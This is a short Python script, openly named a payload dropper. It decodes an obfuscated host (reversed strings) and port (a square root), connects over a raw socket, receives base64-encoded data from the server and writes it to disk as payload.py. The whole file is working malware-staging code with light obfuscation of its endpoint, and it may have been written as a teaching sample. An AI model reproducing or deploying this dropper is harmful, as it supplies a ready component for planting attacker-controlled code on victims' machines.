#!/usr/bin/env python3


import base64
import logging
import socket
import math


class Dropper:

    def __init__(self, host1, host2, number):

        self._host = self.decode_hostname(host1, host2)
        self._port = self.decode_port(number)
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):

        return self._host

    @host.setter
    def host(self, new_host):

        self._host = new_host

    def decode_hostname(self, str1, str2):

        return str2[::-1] + str1[::-1]

    @property
    def port(self):

        return self._port

    @port.setter
    def port(self, new_port):

        self._port = new_port

    def decode_port(self, port):

        return int(math.sqrt(port))

    @property
    def socket(self):

        return self._socket

    def dump_data(self, data):

        with open('payload.py', 'wb') as file:
            file.write(data)

    def download_malicious_code(self):

        try:
            self.socket.connect((self.host, self.port))

        except socket.error:
            logging.debug('Dropper could not connect to the server.')
            return

        print(
            'Hello, I am a Payload Dropper. '
            'I\'m delivered a Payload'
        )

        command = self.socket.recv(1000)
        decode_payload = base64.b64decode(command)
        self.dump_data(decode_payload)


if __name__ == '__main__':

    logging.basicConfig(level=logging.DEBUG)

    dropper = Dropper('tsoh', 'lacol', 729000000)
    dropper.download_malicious_code()

